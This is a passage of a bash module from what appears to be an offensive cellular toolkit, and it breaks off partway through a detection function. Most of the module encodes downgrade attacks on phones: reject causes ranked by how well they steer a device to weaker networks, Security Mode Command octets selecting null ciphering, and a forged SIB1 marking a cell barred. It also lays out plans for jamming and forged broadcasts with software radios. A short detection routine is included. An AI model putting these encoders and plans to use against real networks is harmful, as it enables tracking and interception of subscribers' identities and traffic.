#!/usr/bin/env bash
# Cross-generation downgrade and steering attacks
#
# The reject causes and algorithm identifiers in this module are the real
# assigned values, taken from the specifications:
#
#   TS 24.301 §9.9.3.9     EMM cause values (LTE Attach/TAU Reject)
#   TS 24.501 §9.11.3.2   5GMM cause values (Registration Reject)
#   TS 24.008 §10.5.5.14   GMM cause values (GSM/UMTS)
#   TS 24.008 §10.5.5.12   reject causes for the CS domain
#   TS 33.401 §5.4.2.1     EPS ciphering: EEA0..EEA2 / EIA0..EIA2
#   TS 33.501 §5.5.2       NR ciphering: NEA0..NEA3 / NIA0..NIA3
#   TS 33.102 §6.6         UMTS: UEA0..UEA2 / UIA0..UIA2
#   TS 43.020 / 44.018     GSM: A5/0 (clear) through A5/3
#
# What an attacker with a radio can do here is suppress a higher-RAT cell so
# the UE falls back to a generation that is weaker — a forged SIB with
# cellBarred set, or a jammer on the NR downlink. What a core-side attacker
# can do is answer an attach with a reject cause that steers the UE away.
# This module performs the encodings for real and writes plan files for the
# parts that need a radio or a testbed.
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec HOME=/root even though we write to the invoking user's tree.
# Reset HOME so $HOME-relative defaults resolve to the real user.
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

DWN_CAPABLE=1
# Guarded: when the launcher sources every module into one shell, an
# unconditional definition here would clobber the launcher's own banner.
declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

MOD_TMP="$TMP_DIR/downgrade"
DWN_DIR="$LOOT_DIR/downgrade"
DWN_PLAN_DIR="$DWN_DIR/plans"
DWN_FINDINGS="$DWN_DIR/findings.tsv"
mkdir -p "$MOD_TMP" "$DWN_DIR" "$DWN_PLAN_DIR" 2>/dev/null

# ── sanitisation ────────────────────────────────────────────────────────
dwn_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

# ── reject causes ───────────────────────────────────────────────────────
# Table: cause:rat:name:effect:steering_value
# `steering_value` is how useful the cause is to an attacker trying to move
# a UE down a generation: high = the UE is pushed off this RAT.
dwn_causes() {
    cat << 'EOF'
# EMM (LTE), TS 24.301 9.9.3.9
2:EMM:IMSI unknown in HSS:UE is rejected, no steering effect:low
3:EMM:Illegal UE:UE is rejected and may blacklist the PLMN:low
5:EMM:IMEI not accepted:equipment rejected:low
6:EMM:Illegal ME:equipment rejected:low
7:EMM:EPS services not allowed:UE falls back to 2G/3G for CS services:high
8:EMM:EPS and non-EPS services not allowed:UE may detach entirely:medium
9:EMM:UE identity cannot be derived by the network:re-registration with IMSI:low
10:EMM:Implicitly detached:UE must re-attach:low
11:EMM:PLMN not allowed:PLMN is added to the forbidden list:high
12:EMM:Tracking area not allowed:TA is forbidden for EPS, UE reselects another RAT:high
13:EMM:Roaming not allowed in this tracking area:roaming UE is steered away:high
14:EMM:EPS services not allowed in this PLMN:EPS is barred in this PLMN:high
15:EMM:No suitable cells in tracking area:the classic steering cause, UE looks elsewhere:high
19:EMM:ESM failure:session-level failure, combined with a PDN reject:low
20:EMM:MAC failure:authentication failure:low
21:EMM:Synch failure:replay protection triggered:low
22:EMM:Congestion:UE backs off and may fall back:medium
23:EMM:UE security capabilities mismatch:security negotiation failure:low
24:EMM:Security mode rejected, unspecified:security negotiation failure:low
25:EMM:Not authorized for this CSG:CSG restriction:low
# 5GMM (NR), TS 24.501 9.11.3.2
3:5GMM:Illegal UE:UE is rejected:low
5:5GMM:PEI not accepted:equipment rejected:low
6:5GMM:Illegal ME:equipment rejected:low
7:5GMM:5GS services not allowed:UE falls back to EPS or lower:high
9:5GMM:UE identity cannot be derived by the network:re-registration with SUCI:low
10:5GMM:Implicitly de-registered:UE must re-register:low
11:5GMM:PLMN not allowed:PLMN forbidden for 5GS:high
12:5GMM:Tracking area not allowed:TA forbidden for 5GS:high
13:5GMM:Roaming not allowed in this tracking area:roaming UE steered away:high
15:5GMM:No suitable cells in tracking area:UE is pushed off NR:high
22:5GMM:Congestion:backoff, possible fallback:medium
23:5GMM:UE security capabilities mismatch:security negotiation failure:low
24:5GMM:Security mode rejected, unspecified:security negotiation failure:low
27:5GMM:N1 mode not allowed:the UE disables NR capability — a direct 5G to 4G downshift:high
31:5GMM:Redirection to EPC required:explicit instruction to move to LTE:high
72:5GMM:Non-3GPP access to 5GCN not allowed:access-type restriction:low
73:5GMM:Serving network not authorized:SN not trusted for this UE:medium
# GMM (GSM/UMTS), TS 24.008 10.5.5.14
2:GMM:IMSI unknown in HLR:UE rejected:low
3:GMM:Illegal MS:UE rejected:low
4:GMM:IMEI not accepted:equipment rejected:low
5:GMM:Illegal ME:equipment rejected:low
6:GMM:GPRS services not allowed:UE falls back to GSM CS only:high
7:GMM:GPRS services and non-GPRS services not allowed:UE detaches:medium
8:GMM:MS identity cannot be derived by the network:identity re-request:low
11:GMM:PLMN not allowed:PLMN forbidden:high
12:GMM:Location area not allowed:LA forbidden:high
13:GMM:Roaming not allowed in this location area:roaming UE steered away:high
22:GMM:Congestion:backoff:medium
EOF
}

# Look up a cause for a generation.
dwn_cause_row() {
    local rat="${1:-}" n="${2:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || return 1
    dwn_causes | grep -v '^#' | awk -F: -v r="$rat" -v c="$n" '$1==c && $2==r {print; exit}'
}

dwn_cause_name() {
    local rat="${1:-}" n="${2:-}"
    dwn_cause_row "$rat" "$n" | awk -F: '{print $3}'
}

dwn_cause_effect() {
    local rat="${1:-}" n="${2:-}"
    dwn_cause_row "$rat" "$n" | awk -F: '{print $4}'
}

dwn_cause_steering() {
    local rat="${1:-}" n="${2:-}"
    dwn_cause_row "$rat" "$n" | awk -F: '{print $5}'
}

# A rejected cause arrives as one octet in the reject message. For 5GMM the
# cause IE is 0x59 (type 1, length 1); for EMM it is 0x53; for GMM 0x13.
dwn_reject_encoding() {
    local rat="${1:-}" cause="${2:-}"
    local row; row=$(dwn_cause_row "$rat" "$cause")
    if [[ -z "$row" ]]; then
        printf 'ERROR\tno %s cause %s in the assigned table\n' \
            "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$cause")" >&2
        return 1
    fi
    local name effect steer
    name=$(awk -F: '{print $3}' <<<"$row")
    effect=$(awk -F: '{print $4}' <<<"$row")
    steer=$(awk -F: '{print $5}' <<<"$row")
    local iei proto
    case "$rat" in
        EMM)  iei=0x53; proto="EMM (LTE Attach/TAU Reject)" ;;
        5GMM) iei=0x59; proto="5GMM (5G Registration Reject)" ;;
        GMM)  iei=0x13; proto="GMM (GPRS Attach/RAU Reject)" ;;
        *)    return 1 ;;
    esac
    printf 'rat\t%s\n'          "$rat"
    printf 'cause\t%s\n'        "$cause"
    printf 'cause_hex\t%02X\n'  "$cause"
    printf 'name\t%s\n'         "$(dwn_sanitize "$name")"
    printf 'protocol\t%s\n'     "$proto"
    printf 'cause_ie\t0x%02X\n' "$iei"
    printf 'ie_octets\t%s %02X\n' "$(printf '0x%02X' "$iei")" "$cause"
    printf 'effect\t%s\n'       "$(dwn_sanitize "$effect")"
    printf 'steering_value\t%s\n' "$steer"
}

# ── null cipher identifiers ─────────────────────────────────────────────
# Every generation has an "encryption off" algorithm, and in each case the
# network is permitted to select it. A Security Mode Command naming the null
# algorithm is accepted by a UE that should have refused it.
#   rat:alg:cipher_name:integrity_name:type:bits:exposes
dwn_null_ciphers() {
    cat << 'EOF'
# 5G / NR — TS 33.501 5.5.2, TS 24.501 9.11.3.34
NR:NEA0:NEA0 (null ciphering):NIA0 (null integrity):both:4:no confidentiality and no integrity on NAS and AS
NR:NEA1:SNOW3G:NIA1:128-eea1:4:legacy stream cipher, 128-bit key
NR:NEA2:AES-CTR:NIA2:128-eea2:4:AES-based, the normal choice
NR:NEA3:ZUC:NIA3:128-eea3:4:Chinese stream cipher
# LTE / EPC — TS 33.401 5.4.2
LTE:EEA0:EEA0 (null ciphering):EIA0 (null integrity):both:4:no confidentiality; EIA0 only for unauthenticated emergency
LTE:EEA1:SNOW3G:EIA1:128-eea1:4:legacy stream cipher
LTE:EEA2:AES-CTR:EIA2:128-eea2:4:AES-based, the normal choice
LTE:EEA3:ZUC:EIA3:128-eea3:4:optional in EPS
# UMTS / UTRAN — TS 33.102 6.6
UMTS:UEA0:UEA0 (null ciphering):UIA0 (null integrity):both:4:no confidentiality on the radio bearer
UMTS:UEA1:KASUMI:UIA1:kasumi:4:KASUMI is broken in practice
UMTS:UEA2:SNOW3G:UIA2:128-uea2:4:stronger than KASUMI
# GSM / GERAN — TS 43.020, TS 44.018
GSM:A5/0:A5/0 (no ciphering):none:both:0:the IMSI and all traffic are in the clear
GSM:A5/1:A5/1:A5/1:both:64:64-bit key, broken by a known-plaintext attack in minutes
GSM:A5/2:A5/2:A5/2:both:64:weaker than A5/1, trivially broken
GSM:A5/3:A5/3:A5/3:both:64:the strongest GSM cipher, still only 64-bit
EOF
}

dwn_null_table() {
    printf 'rat\talg\tcipher\tintegrity\tbits\texposes\n'
    dwn_null_ciphers | grep -v '^#' | awk -F: '{printf "%s\t%s\t%s\t%s\t%s\t%s\n", $1,$2,$3,$4,$6,$7}'
}

# Every generation must have its null algorithm present. Returns the rows.
dwn_null_for_rat() {
    local rat="${1:-}"
    dwn_null_ciphers | grep -v '^#' | awk -F: -v r="$rat" '$1==r'
}

dwn_is_null_alg() {
    local alg="${1:-}"
    case "${alg^^}" in
        NEA0|NIA0|EIA0|EEA0|UIA0|UEA0|A5/0|A50|NULL|NONE) return 0 ;;
        *) return 1 ;;
    esac
}

# The assigned algorithm identifiers, per generation, as PUBLISHED.
# Ciphering and integrity are separate 4-bit fields and either may be null
# while the other is not — that asymmetry is the whole point of this module.
#
#   TS 33.501 §5.11.1.1  NR: NEA0..NEA3 = 0..3, NIA0..NIA3 = 0..3
#   TS 33.401 §5.1.4     EPS: EEA0..EEA3 = 0..3, EIA0..EIA3 = 0..3
#   TS 33.102 §6.6       UMTS: UEA0..UEA2 = 0..2, UIA0..UIA2 = 0..2
#   TS 43.020 / 44.018   GSM: A5/0..A5/3 = 0..3, no integrity algorithm
# The NR values (NEA0=0x00 .. NEA3=0x03, NIA0=0x00 .. NIA3=0x03) are
# independently confirmed against the Go NAS library's security/parameters.go,
# which cites TS 33.501 5.11.1.1 for exactly these constants.
dwn_alg_id() {
    local alg="${1:-}"
    case "${alg^^}" in
        NEA0|NIA0|EEA0|EIA0|UEA0|UIA0|A5/0|A50) echo 0 ;;
        NEA1|NIA1|EEA1|EIA1|UEA1|UIA1|A5/1|A51) echo 1 ;;
        NEA2|NIA2|EEA2|EIA2|UEA2|UIA2|A5/2|A52) echo 2 ;;
        NEA3|NIA3|EEA3|EIA3|A5/3|A53)           echo 3 ;;
        *) return 1 ;;
    esac
}

# True when the name is a CIPHERING algorithm (not an integrity one).
dwn_is_cipher_alg() {
    case "${1^^}" in
        NEA0|NEA1|NEA2|NEA3|EEA0|EEA1|EEA2|EEA3|UEA0|UEA1|UEA2|A5/0|A50|A5/1|A51|A5/2|A52|A5/3|A53) return 0 ;;
        *) return 1 ;;
    esac
}

# True when the name is an INTEGRITY algorithm.
dwn_is_integrity_alg() {
    case "${1^^}" in
        NIA0|NIA1|NIA2|NIA3|EIA0|EIA1|EIA2|EIA3|UIA0|UIA1|UIA2) return 0 ;;
        *) return 1 ;;
    esac
}

# ── Security Mode Command encoding ──────────────────────────────────────
# The Security Mode Command carries the selected NAS algorithms in a single
# octet: bits 8-5 are the ciphering algorithm, bits 4-1 the integrity
# algorithm (TS 24.501 §9.11.3.34 for 5GMM, TS 24.307 for EMM). The values
# are the assigned algorithm identifiers, and 0 means null in every case.
dwn_build_security_mode() {
    local alg="${1:-}" arg2="${2:-}" arg3="${3:-}"
    local rat="NR" integrity=""
    [[ -n "$alg" ]] || { printf 'ERROR\tusage: --build-security-mode <cipher-alg> [integrity-alg] [NR|LTE|UMTS|GSM]\n' >&2; return 2; }

    # Two calling shapes share one signature and must both keep working:
    #   --build-security-mode <alg> [RAT]                 (historical)
    #   --build-security-mode <cipher> <integrity> [RAT]  (new)
    # The second argument is a RAT name only when it is one; otherwise it is
    # the integrity algorithm. Deciding by CONTENT, not by position, is what
    # keeps the existing single-algorithm output byte-identical.
    case "${arg2^^}" in
        NR|LTE|UMTS|GSM) rat="${arg2^^}"; [[ -n "$arg3" ]] && rat="${arg3^^}" ;;
        '')              : ;;
        *)               integrity="${arg2^^}"; [[ -n "$arg3" ]] && rat="${arg3^^}" ;;
    esac
    local a="${alg^^}"
    local cipher_n integrity_n

    # The single-algorithm form is unchanged: one name sets BOTH fields, and
    # an integrity name given alone implies the matching cipher (this is the
    # historical behaviour and the existing assertions depend on it).
    if [[ -z "$integrity" ]]; then
        case "$a" in
            NEA0|NIA0) cipher_n=0; integrity_n=0 ;;
            NEA1|NIA1) cipher_n=1; integrity_n=1 ;;
            NEA2|NIA2) cipher_n=2; integrity_n=2 ;;
            NEA3|NIA3) cipher_n=3; integrity_n=3 ;;
            EEA0|EIA0) cipher_n=0; integrity_n=0 ;;
            EEA1|EIA1) cipher_n=1; integrity_n=1 ;;
            EEA2|EIA2) cipher_n=2; integrity_n=2 ;;
            EEA3|EIA3) cipher_n=3; integrity_n=3 ;;
            UEA0|UIA0) cipher_n=0; integrity_n=0 ;;
            UEA1|UIA1) cipher_n=1; integrity_n=1 ;;
            UEA2|UIA2) cipher_n=2; integrity_n=2 ;;
            A5/0|A50)  cipher_n=0; integrity_n=0 ;;
            A5/1|A51)  cipher_n=1; integrity_n=0 ;;
            A5/2|A52)  cipher_n=2; integrity_n=0 ;;
            A5/3|A53)  cipher_n=3; integrity_n=0 ;;
            *) printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$alg")" >&2; return 2 ;;
        esac
        integrity="$a"
    else
        # Two-argument form: cipher and integrity are named independently, so
        # the realistic downgrade (strong ciphering, null integrity) is
        # representable at all.
        local i="${integrity^^}"
        dwn_is_cipher_alg "$a" || {
            printf 'ERROR\tfirst argument must be a ciphering algorithm, got: %s\n' \
                "$(dwn_sanitize "$alg")" >&2; return 2; }
        dwn_is_integrity_alg "$i" || {
            printf 'ERROR\tsecond argument must be an integrity algorithm, got: %s\n' \
                "$(dwn_sanitize "$integrity")" >&2; return 2; }
        cipher_n=$(dwn_alg_id "$a")       || { printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$alg")" >&2; return 2; }
        integrity_n=$(dwn_alg_id "$i")    || { printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$integrity")" >&2; return 2; }
        integrity="$i"
    fi

    local octet=$(( (cipher_n << 4) | integrity_n ))
    printf 'rat\t%s\n'            "$rat"
    printf 'algorithm\t%s\n'      "$a"
    printf 'integrity_algorithm\t%s\n' "$integrity"
    printf 'cipher_id\t%s\n'      "$cipher_n"
    printf 'integrity_id\t%s\n'   "$integrity_n"
    printf 'smc_octet\t%02X\n'    "$(( octet & 0xFF ))"
    printf 'smc_bits\t%s\n'       "$(printf '%08d' "$(echo "obase=2;$octet" | bc)")"
    # Null-ciphering and null-integrity are decided SEPARATELY. Reporting a
    # single "null_algorithm" flag would hide the module's own subject matter:
    # NEA2 with NIA0 is a strong cipher with no integrity, not a null session.
    local is_gsm=0
    [[ "${rat^^}" == "GSM" ]] && is_gsm=1
    if dwn_is_null_alg "$a"; then
        printf 'cipher_null\tyes\n'
    else
        printf 'cipher_null\tno\n'
    fi
    if (( is_gsm )); then
        printf 'integrity_null\tn/a\n'
    elif dwn_is_null_alg "$integrity"; then
        printf 'integrity_null\tyes\n'
    else
        printf 'integrity_null\tno\n'
    fi
    # GSM carries no integrity algorithm, so the null question there is
    # entirely about the cipher. Everywhere else BOTH must be null for the
    # session to be a true null session.
    if dwn_is_null_alg "$a" && { (( is_gsm )) || dwn_is_null_alg "$integrity"; }; then
        printf 'null_algorithm\tyes\n'
        if (( is_gsm )); then
            printf 'exposure\tno ciphering: the IMSI and all traffic are in the clear\n'
        else
            printf 'exposure\tno confidentiality and no integrity: the session is readable and forgeable\n'
        fi
    else
        printf 'null_algorithm\tno\n'
        if dwn_is_null_alg "$a" || { (( ! is_gsm )) && dwn_is_null_alg "$integrity"; }; then
            printf 'exposure\tpartial: %s\n' "$(dwn_null_exposure "$a" "$integrity" "${rat^^}")"
        fi
    fi
    # A ciphering algorithm with no integrity algorithm beside it is the
    # signature of a steered session, so name it where it happens.
    if ! dwn_is_null_alg "$a" && (( ! is_gsm )) && dwn_is_null_alg "$integrity"; then
        printf 'downgrade_signature\tcipher!=integrity: strong ciphering with null integrity — signalling is forgeable while the traffic looks protected\n'
    fi
    # GSM has no integrity algorithm at all, which is the point.
    if (( is_gsm )); then
        printf 'integrity_available\tno (GSM has no integrity protection on the air interface)\n'
    fi
}

# ── SIB1 with cellBarred — the forged-SIB downgrade vector ──────────────
#
# The module header describes suppressing a higher-RAT cell with a forged SIB
# carrying cellBarred. The *encoding* half of that is pure computation and is
# done here for real; the transmit half is the `forged-sib` plan.
#
# Layout is the tree's own SIB1 body convention, which is what
# `10_lte_air.sh --decode-sib 1` parses:
#
#   PLMN        3 octets   TS 24.008 §10.5.1.3 BCD (MCC digit2|digit1,
#                          MNC digit3|MCC digit3, MNC digit2|digit1)
#   TAC         2 octets   tracking area code, 16 bits
#   cellIdentity 28 bits   = 7 nibbles, TS 36.331 §6.2.2
#                 = 17 nibbles total
#
# cellBarred and intraFreqReselection are appended as one further octet so a
# built SIB1 round-trips through that reader with the flag set:
#
#   bit 7   cellBarred           1 = barred, 0 = notBarred
#   bit 6   intraFreqReselection 1 = notAllowed, 0 = allowed
#
# This is NOT TS 36.331 APER. Real SIB1 is bit-packed and cellBarred sits
# inside cellAccessRelatedInfo behind a CHOICE, so a bit-exact encoding needs
# an APER codec this tree does not ship. What is real here is the field layout
# and the values — which is what a lab needs in order to build the frame it
# broadcasts with srsRAN or OpenAirInterface, and enough for the reader above
# to confirm the flag survived. The distinction is stated in the output.
dwn_encode_plmn() {
    local mcc="${1:-}" mnc="${2:-}"
    [[ "$mcc" =~ ^[0-9]{3}$ ]] || return 1
    [[ "$mnc" =~ ^[0-9]{2,3}$ ]] || return 1
    local m1="${mcc:0:1}" m2="${mcc:1:1}" m3="${mcc:2:1}"
    local n1 n2 n3
    if (( ${#mnc} == 3 )); then
        n1="${mnc:0:1}"; n2="${mnc:1:1}"; n3="${mnc:2:1}"
    else
        n1="${mnc:0:1}"; n2="${mnc:1:1}"; n3="f"
    fi
    printf '%s%s%s%s%s%s' "$m2" "$m1" "$n3" "$m3" "$n2" "$n1"
}

dwn_build_sib1() {
    local mcc="${1:-001}" mnc="${2:-01}" tac="${3:-1}" cellid="${4:-0}" barred="${5:-barred}"
    local intra="${6:-notAllowed}"

    local plmn
    plmn=$(dwn_encode_plmn "$mcc" "$mnc") || {
        printf 'ERROR\tbad PLMN: mcc=%s mnc=%s (want 3 and 2-3 digits)\n' \
            "$(dwn_sanitize "$mcc")" "$(dwn_sanitize "$mnc")" >&2; return 1; }
    [[ "$tac" =~ ^[0-9]+$ ]] && (( tac >= 0 && tac <= 65535 )) || {
        printf 'ERROR\tTAC out of range: %s (want 0..65535)\n' "$(dwn_sanitize "$tac")" >&2; return 1; }
    [[ "$cellid" =~ ^[0-9]+$ ]] && (( cellid >= 0 && cellid <= 268435455 )) || {
        printf 'ERROR\tcellIdentity out of range: %s (want 0..2^28-1 = 268435455)\n' \
            "$(dwn_sanitize "$cellid")" >&2; return 1; }

    local barred_bit intra_bit
    case "$barred" in
        barred)    barred_bit=1 ;;
        notBarred) barred_bit=0 ;;
        *) printf 'ERROR\tbad cellBarred: %s (want barred|notBarred)\n' "$(dwn_sanitize "$barred")" >&2; return 1 ;;
    esac
    case "$intra" in
        notAllowed) intra_bit=1 ;;
        allowed)    intra_bit=0 ;;
        *) printf 'ERROR\tbad intraFreqReselection: %s (want allowed|notAllowed)\n' "$(dwn_sanitize "$intra")" >&2; return 1 ;;
    esac

    local tac_hex cell_hex flags
    tac_hex=$(printf '%04x' "$tac")
    cell_hex=$(printf '%07x' "$cellid")
    flags=$(printf '%02x' "$(( barred_bit * 128 + intra_bit * 64 ))")

    local body="${plmn}${tac_hex}${cell_hex}"
    printf 'message\tSIB1 (SystemInformationBlockType1)\n'
    printf 'encoding\ttree nibble convention (see module notes) — NOT TS 36.331 APER\n'
    printf 'plmn_octets\t%s\n' "$plmn"
    printf 'mcc\t%s\n' "$mcc"
    printf 'mnc\t%s\n' "$mnc"
    printf 'tracking_area_code\t%s\n' "$tac"
    printf 'tracking_area_code_hex\t%s\n' "$tac_hex"
    printf 'cell_identity\t%s\n' "$cellid"
    printf 'cell_identity_hex\t%s\n' "$cell_hex"
    printf 'cell_barred\t%s\n' "$barred"
    printf 'intra_freq_reselection\t%s\n' "$intra"
    printf 'flags_octet\t%s\n' "$flags"
    printf 'body\t%s\n' "$body"
    printf 'body_with_flags\t%s%s\n' "$body" "$flags"
    printf 'nibbles\t%s\n' "$(( ${#body} + ${#flags} ))"
    printf 'decode_with\t14_lte_air.sh --decode-sib 1 <body>\n'
}

# One line describing what a given cipher/integrity pair leaves exposed.
dwn_null_exposure() {
    local cipher="${1:-}" integrity="${2:-}" rat="${3:-}"
    if dwn_is_null_alg "$cipher" && dwn_is_null_alg "$integrity"; then
        printf 'no confidentiality and no integrity: the session is readable and forgeable'
    elif dwn_is_null_alg "$cipher"; then
        printf 'null ciphering with %s integrity: the traffic is readable but not forgeable' "$integrity"
    elif dwn_is_null_alg "$integrity"; then
        printf '%s ciphering with null integrity: the traffic is confidential but every signalling message is forgeable' "$cipher"
    else
        printf '%s/%s: no null algorithm selected' "$cipher" "$integrity"
    fi
}

# ── the downgrade paths ─────────────────────────────────────────────────
# Three concrete mechanisms, each stated with what it needs and what the UE
# does in response. These are descriptions of real behaviour, not guesses.
dwn_path() {
    local name="${1:-}"
    case "$name" in
        steer-down)
            printf 'path\tsteer-down\n'
            printf 'generation\t5G -> 4G\n'
            printf 'mechanism\t%s\n' "answer the Registration Request with a 5GMM Registration Reject carrying cause 27 (N1 mode not allowed) or 31 (Redirection to EPC required)"
            printf 'ue_behaviour\t%s\n' "on cause 27 the UE disables N1 mode capability and reselects E-UTRAN; on cause 31 it performs an EPS attach"
            printf 'requires\t%s\n' "a core network that will emit the reject, or a forged reject on a link the UE follows"
            printf 'detect_by\t%s\n' "a Registration Reject with cause 27/31 followed by an EPS Attach from the same IMSI"
            printf 'status\t%s\n' "encodable here; emitting it needs the plan"
            ;;
        jamming-suppress)
            printf 'path\tjamming-suppress\n'
            printf 'generation\t5G -> 4G (or 4G -> 3G/2G)\n'
            printf 'mechanism\t%s\n' "raise the noise floor on the NR downlink around the SSB so cell search fails, then let the UE fall back"
            printf 'ue_behaviour\t%s\n' "S-criterion failure on NR triggers reselection to the strongest lower-RAT cell"
            printf 'requires\t%s\n' "a transmit-capable SDR (HackRF, BladeRF, USRP or LimeSDR) and a licence for the band"
            printf 'detect_by\t%s\n' "an NR measurement report that disappears while LTE RSRP is unchanged, then a RAT change with no reject cause"
            printf 'status\t%s\n' "handoff — needs a radio"
            ;;
        cs-fallback)
            printf 'path\tcs-fallback\n'
            printf 'generation\t4G/5G -> 3G/2G\n'
            printf 'mechanism\t%s\n' "force a mobile-terminated or mobile-originated CS service; with no IMS the UE falls back to UTRAN/GERAN"
            printf 'ue_behaviour\t%s\n' "EPS Fallback or RRC Connection Release with redirectedCarrierInfo towards UTRAN/GERAN"
            printf 'imsi_exposure\t%s\n' "yes — a 2G fallback performs a Location Update that can request the IMSI in the clear"
            printf 'cipher_negotiated\t%s\n' "A5/1 or worse is common; A5/0 if the network allows it"
            printf 'requires\t%s\n' "a 2G/3G radio access network reachable from the target area, or a testbed femto"
            printf 'detect_by\t%s\n' "an S1 Release or handover to UTRAN/GERAN, followed by a Location Updating Request and an Identity Request (IMSI)"
            printf 'status\t%s\n' "handoff — needs the legacy RAN"
            ;;
        forged-sib)
            printf 'path\tforged-sib\n'
            printf 'generation\t5G -> 4G (or 4G -> 3G/2G)\n'
            printf 'mechanism\t%s\n' "broadcast a SIB1 for the target cell with cellBarred=barred so the UE treats the cell as unavailable and reselects the strongest remaining RAT"
            printf 'ue_behaviour\t%s\n' "cellBarred is a normal broadcast field, so the UE reports no error — it simply considers the cell barred and performs cell reselection"
            printf 'sib_fields\t%s\n' "cellAccessRelatedInfo.cellBarred (barred|notBarred) and intraFreqReselection (allowed|notAllowed), TS 36.331 6.2.2"
            printf 'requires\t%s\n' "a transmit-capable SDR (HackRF, BladeRF, USRP or LimeSDR) and srsRAN or OpenAirInterface able to broadcast a modified SIB1"
            printf 'detect_by\t%s\n' "a SIB1 whose cellBarred is barred while the cell is still transmitting normally, followed by a RAT change with no reject cause and no measurement-report gap"
            printf 'status\t%s\n' "encoding half is real — $0 --build-sib1; broadcasting it is the forged-sib plan"
            ;;
        *) printf 'ERROR\tunknown path: %s (want steer-down|jamming-suppress|cs-fallback|forged-sib)\n' \
               "$(dwn_sanitize "$name")" >&2; return 2 ;;
    esac
}

# ── detection ───────────────────────────────────────────────────────────
# Given a capture-derived TSV, identify a downgrade from three independent
# signals:
#   1. a RAT change where the higher RAT was present before
#   2. a reject cause that steers away from the higher RAT
#   3. a cipher change to a null algorithm across the transition
# The input format is one record per line:
#   ts  rat  event  detail
# where event is one of: attach, reject, rat_change, cipher, measurement
dwn_sample_capture() {
    # A synthetic capture that contains all three downgrade signatures, used
    # by the selftest and as the documented input format.
    cat << 'EOF'
1	NR	attach	Registration Request imsi=208011234567890
2	NR	reject	Registration Reject cause=27 name=N1 mode not allowed
3	NR	rat_change	NR -> LTE
4	LTE	attach	Attach Request imsi=208011234567890
5	LTE	cipher	cipher=EEA1 integrity=EIA1
6	LTE	measurement	rsrp=-95 earfcn=6300
7	LTE	cipher	cipher=EEA0 integrity=EIA0
EOF
}

dwn_detect() {
    local file="${1:-}"
    [[ -n "$file" ]] || { printf 'ERROR\tusage: --detect <pcap-or-tsv>\n' >&2; return 2; }
    [[ -f "$file" ]] || { printf 'ERROR\tno such file: %s\n' "$(dwn_sanitize "$file")" >&2; return 1; }
    [[ -r "$file" ]] || { printf 'ERROR\tcannot read: %s\n' "$(dwn_sanitize "$file")" >&2; return 1; }

    # A pcap needs tshark; a TSV record file is read directly.
    local work="$file"
    if [[ "$file" == *.pcap || "$file" == *.pcapng ]]; then
        command -v tshark >/dev/null 2>&1 || {
            printf 'ERROR\tno tshark — install wireshark-cli to read captures\n' >&2; return 1; }
        work="$MOD_TMP/detect.tsv"
        if ! tshark -r "$file" -T fields \
              -e frame.time_epoch -e _ws.col.Protocol -e _ws.col.Info 2>/dev/null \
              | awk -F'\t' '
                    NF>=3 && $3!="" {
                        info=$3; i=tolower(info); ev="other"
                        if (i ~ /reject/)                            ev="reject"
                        else if (i ~ /rat_change|rat change|handover/) ev="rat_change"
                        else if (i ~ /cipher/)                        ev="cipher_change"
                        printf "%s\t%s\t%s\t%s\n", $1, $2, ev, info
                    }' > "$work"; then
            printf 'ERROR\ttshark could not read %s\n' "$(dwn_sanitize "$file")" >&2
            return 1
        fi
        [[ -s "$work" ]] || {
            printf 'ERROR\tno protocol records found in %s\n' "$(dwn_sanitize "$file")" >&2; return 1; }
    fi

    local records=0
    records=$(grep -c . "$work" 2>/dev/null || echo 0)
    (( records > 0 )) || { printf 'ERROR\tno records in %s\n' "$(dwn_sanitize "$file")" >&2; return 1; }

    # Signal 1: a steering reject cause.
    local steers
    steers=$(awk -F'\t' '
        tolower($3) ~ /reject/ {
            n=""
            if (match($4, /cause=[0-9]+/)) { n=substr($4, RSTART+6, RLENGTH-6) }
            if (n == 7 || n == 11 || n == 12 || n == 13 || n == 14 || n == 15 || n == 27 || n == 31) print $0
        }' "$work")
    # Signal 2: a RAT change downwards.
    local ratdown
    ratdown=$(awk -F'\t' 'tolower($3) ~ /rat_change|rat change|handover/ {print $0}' "$work")
    # Signal 3: a cipher change to null.
    local nullcipher
    nullcipher=$(awk -F'\t' '
        tolower($3) ~ /cipher/ && tolower($4) ~ /(eea0|nea0|uea0|a5\/0|a50)/ {print $0}' "$work")
